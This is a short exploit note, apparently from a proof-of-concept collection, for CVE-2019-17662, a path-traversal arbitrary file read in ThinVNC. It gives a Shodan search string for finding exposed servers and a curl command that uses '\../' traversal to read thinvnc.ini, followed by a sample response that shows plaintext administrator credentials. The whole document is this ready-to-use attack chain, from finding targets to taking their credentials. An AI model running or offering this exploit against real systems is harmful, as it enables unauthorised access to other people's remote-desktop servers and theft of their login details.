## CVE-2019-17662
ThinVNC - Arbitrary File Read.
- Shodan dork: <br/>
```
"ThinVNC"
```
	  
- POC:
```
curl -k -X 'GET' "http://target_ip_address:port/a/\../\../thinvnc.ini"
	  
Response:
[Authentication]
Unicode=0
User=admin
Password=admin
Type=Digest
[Http]
Port=8080
Enabled=1
[Tcp]
Port=
[General]
AutoStart=1
```
